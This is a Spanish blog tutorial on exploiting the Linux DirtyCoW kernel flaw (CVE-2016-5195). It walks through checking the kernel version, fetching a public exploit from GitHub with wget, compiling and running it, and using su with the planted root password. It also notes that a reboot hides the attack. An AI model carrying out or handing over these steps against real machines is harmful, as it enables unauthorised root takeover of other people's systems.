Hace ya unas semanas salió a la luz la vulnerabilidad conocida como DirtyCoW, registrada bajo el nombre de CVE-2016-5195. Esta vulnerabiliad permite a cualquier usuario con acceso a la máquina de forma limitada llegar a convertirse en root y tomar el control total de la máquina. Tal y como nos decía <a href="http://lamiradadelreplicante.com/2016/10/21/dirty-cow-vulnerabilidad-en-linux-que-permite-escalada-de-privilegios/">La Mirada del Replicante</a>:<br><blockquote>Clasificada de forma oficial como <a href="https://access.redhat.com/security/cve/cve-2016-5195"><strong>CVE-2016-5195</strong></a> y descubierto por <strong>Phil Oester</strong> –un experto en seguridad y desarrollador de Linux–, <strong>Dirty COW</strong> (<em>copy-on-write</em>) permite una <strong>escalada de privilegios</strong> de forma remota o local.<br><br>....<br><br>La vulnerabilidad ha estado <strong>presente durante muchos años</strong> (desde la versión 2.6.22 del kernel, liberada en <strong>2007</strong>) e incluso Linus fue consciente de ella en su momento.</blockquote><br>Hoy vamos a ver como aprovechar esta situación. Válida para todos los sistemas con kernel Linux, incluido Android (aunque allí el procedimiento no es tan sencillo).<br><br><img class="alignnone size-full wp-image-569" src="https://files.adrianistan.eu/dirty-cow.jpg" alt="dirty-cow" width="900" height="587" /><br><h2>Comprobando requisitos</h2><br>En primer lugar la vulnerabilidad requiere disponer de acceso a la máquina con un usuario no-privilegiado. Puede ser de forma local o remota vía SSH, pero este requisito ya hace que a muchos servidores no les afecte de manera directa.<br><br>La vulnerabilidad además ya se encuentra parcheada en muchas distros GNU/Linux y no se podrá realizar. Es por tanto requisito que la versión del kernel esté entre 2.6.22 y 4.4.26. Puedes comprobar la versión del kernel con el comando uname.<br><pre>uname -a</pre><br><h2>Descargando el exploit</h2><br>Ahora el siguiente paso es descargar el exploit. Yo voy a usar el exploit diseñado por <span class="pl-c">Gabriele Bonacini</span> y que lo podéis descargar desde GitHub, bien con <a href="https://github.com/aarroyoc/CVE-2016-5195/archive/master.zip">un fichero ZIP</a> o bien mediante <a href="https://github.com/aarroyoc/CVE-2016-5195">el programa Git</a>. Puedes descargarlo desde la línea de comandos así:<br><pre>wget -O dirtycow.zip https://github.com/AdrianArroyoCalle/CVE-2016-5195/archive/master.zip<br><br>unzip dirtycow.zip<br><br>cd CVE-2016-5195-master</pre><br>Ahora debemos compilar el pequeño programa en C++ que se ha descargado. Simplemente escribimos en la terminal:<br><pre>make</pre><br><h2>Ejecutando el exploit</h2><br>Ya estamos listos para ejecutar el exploit. Abrimos desde la terminal el programa que acabamos de compilar.<br><pre>./dcow</pre><br>Este exploit, si funciona correctamente, nos dirá por pantalla que la contraseña del root es <em>dirtyCowFun</em>. Si tarda demasiado el programa entonces el exploit no ha funcionado. ¿Qué es lo que ha hecho? Aprovechando la vulnerabilidad Dirty CoW ha logrado cambiar, solo en memoria, el contenido del archivo /etc/passwd, que es donde Linux guarda las contraseñas. Este cambio como repito solo se produce en la memoria, pues el archivo físico en el disco sigue inalterado. Si reiniciamos la máquina habrá que repetir el proceso. Esto tiene la gravedad de que es fácil no darse cuenta de si la vulnerabilidad ha sido explotada, el atacante simplemente reinicia la máquina con reboot y la contraseña del root vuelve a su estado habitual.<br><br>Sabiendo esto, ya podemos escribir con total seguridad<br><pre>su</pre><br>Y cuando nos pregunte la contraseña, escribimos <em>dirtyCowFun</em>.<br><br>Enhorabuena, si has llegado hasta aquí conseguiste escalar privilegios y ya eres root. Ahora no seas demasiado malo, te recuerdo que un gran poder conlleva una gran responsabilidad.